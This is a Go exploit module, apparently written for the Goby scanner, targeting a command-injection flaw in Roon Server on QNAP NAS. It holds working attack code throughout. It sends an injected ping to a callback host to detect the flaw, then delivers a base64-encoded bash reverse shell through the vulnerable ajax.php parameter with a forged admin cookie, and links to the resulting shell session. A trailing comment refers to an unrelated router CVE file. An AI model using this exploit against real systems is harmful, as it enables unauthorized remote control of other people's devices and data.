package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "QNAP NAS RoonServer RCE",
    "Description": "The QNAP security team has detected an attack campaign in the wild related to a vulnerability in Roon Server. QNAP NAS running the following versions of Roon Server may be susceptible to attack:Roon Server 2021-02-01 and earlier We have already notified Roon Labs of the issue and are thoroughly investigating the case. We will release security updates and provide further information as soon as possible.",
    "Product": "QNAP NAS",
    "Homepage": "https://www.qnap.com.cn/en/",
    "DisclosureDate": "2021-05-15",
    "Author": "gaopeng2@baimaohui.net",
    "FofaQuery": "app=\"QNAP-NAS\"",
    "GobyQuery": "app=\"QNAP-NAS\"",
    "Level": "3",
    "Impact": "Control the server to perform any operation",
    "Recommendation": "QNAP recommends users not to expose their NAS to the internet. Before a security update is available from Roon Labs, we also recommend disabling Roon Server to prevent potential attacks.",
    "References": null,
    "RealReferences": [
        "https://www.qnap.com.cn/en/security-advisory/QSA-21-17"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "Name": "AttackType",
            "Type": "select",
            "Value": "goby_shell_linux"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "RCE"
    ],
    "CVEIDs": null,
    "CVSSScore": "N/A",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Disable": false,
    "PocId": "10194"
}`
	bashBase64CMD := func(cmd string) string {
		cmdBase64 := base64.StdEncoding.EncodeToString([]byte(cmd))
		return `{echo,` + cmdBase64 + `}|{base64,-d}|{bash,-i}`
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//nil,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			randomHex := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(randomHex)
			uri := "/cgi-bin/qpkg/RoonServer/ajax/ajax.php?a=updateformfield&t=$(ping+-c+1+%s)"
			cfg := httpclient.NewPostRequestConfig(fmt.Sprintf(uri, checkUrl))
			cfg.Header.Store("SOAPAction", "\"\"")
			cfg.Header.Store("Content-Type", "text/xml;charset=UTF-8")
			cfg.Header.Store("Cookie", "NAS_USER=admin")
			cfg.VerifyTls = false
			httpclient.DoHttpRequest(hostinfo, cfg)
			if godclient.PullExists(randomHex, time.Second*15) {
				stepLogs.VulURL = hostinfo.String()
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if stepLogs.Params["AttackType"].(string) == "goby_shell_linux" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					cmd := godclient.ReverseTCPByBash(rp)
					cmd = url.QueryEscape(bashBase64CMD(cmd))
					uri := "/cgi-bin/qpkg/RoonServer/ajax/ajax.php?a=updateformfield&t=$(%s)"
					cfg := httpclient.NewPostRequestConfig(fmt.Sprintf(uri, cmd))
					cfg.Header.Store("SOAPAction", "\"\"")
					cfg.Header.Store("Content-Type", "text/xml;charset=UTF-8")
					cfg.Header.Store("Cookie", "NAS_USER=admin")
					cfg.VerifyTls = false
					_, _ = httpclient.DoHttpRequest(expResult.HostInfo, cfg)
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 10):

					}
				}
			}
			return expResult
		},
	))
}

// generate by genpoc: main.exe -cve CVE-2021-32030 -out HuaShuo_GT_GT-AC2900_Unauthorized_CVE_2021_32030.go
